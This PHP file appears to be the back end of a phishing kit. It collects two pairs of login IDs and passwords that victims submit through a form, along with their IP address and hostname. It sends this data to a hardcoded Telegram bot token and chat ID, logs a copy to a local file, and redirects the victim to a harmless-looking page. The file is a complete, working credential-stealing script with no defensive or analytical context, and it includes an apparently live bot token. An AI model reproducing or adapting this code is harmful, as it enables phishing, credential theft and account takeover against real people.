<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "----------------------------------------------------------------------[$ip]------\n";
$bilsmg .= "ID:             : ".$_POST['hId']."\n";
$bilsmg .= "PASS:           : ".$_POST['hPs']."\n";
$bilsmg .= "---------[LOG-2]-------\n";
$bilsmg .= "ID:             : ".$_POST['uId']."\n";
$bilsmg .= "PASS:           : ".$_POST['uPs']."\n";
$bilsmg .= "IP              : $ip | $hostname\n";

$token = "5341209074:AAEz8VrqTFdVbGdHFkTBOqNW7Ko_JGj3swo";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1348600628&text=" . urlencode($bilsmg)."" );
$f = fopen("python/python.php", "a");
	fwrite($f, $bilsmg);
header("Location: homes.html");
?>



